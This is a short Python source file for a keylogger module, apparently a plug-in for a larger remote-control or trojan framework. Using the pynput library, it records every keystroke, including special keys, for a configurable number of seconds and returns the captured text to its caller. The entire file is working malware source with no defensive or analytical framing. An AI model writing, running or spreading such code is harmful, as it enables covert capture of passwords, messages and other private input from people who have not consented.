from pynput.keyboard import Key, Listener
import time
import json
import threading

log = []

def on_press(key):
    global log
    try:
        log.append(str(key.char))
    except AttributeError:
        if key == Key.space: log.append(" ")
        elif key == Key.enter: log.append("\n")
        else: log.append(f"[{str(key)}]")

def run(**args):
    duration = args.get("duration", 30)
    print(f"[*] In keylogger module. Logging for {duration} seconds...")
    global log
    log = []
    with Listener(on_press=on_press) as listener:
        time.sleep(duration)
        listener.stop()
    return "".join(log)
